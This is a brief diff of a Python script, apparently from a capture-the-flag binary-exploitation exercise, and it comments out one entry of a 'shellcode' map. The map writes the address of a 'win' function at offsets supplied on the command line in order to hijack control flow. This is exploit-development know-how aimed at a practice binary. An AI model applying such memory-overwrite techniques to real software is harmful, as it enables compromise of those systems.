@@ -40,7 +40,7 @@ from itertools import cycle
 
 shellcode = {
     int(sys.argv[1]): b"\xad\x61\x55\x56", # $1 = {<text variable, no debug info>} 0x565561ad <win>
-    int(sys.argv[2]): b"\xad\x61\x55\x56", # $1 = {<text variable, no debug info>} 0x565561ad <win>
+    # int(sys.argv[2]): b"\xad\x61\x55\x56", # $1 = {<text variable, no debug info>} 0x565561ad <win>
     #  87: 0x565561adb, # $1 = {<text variable, no debug info>} 0x565561ad <win>
     #  59: 0x565561adb, # $1 = {<text variable, no debug info>} 0x565561ad <win>
 }
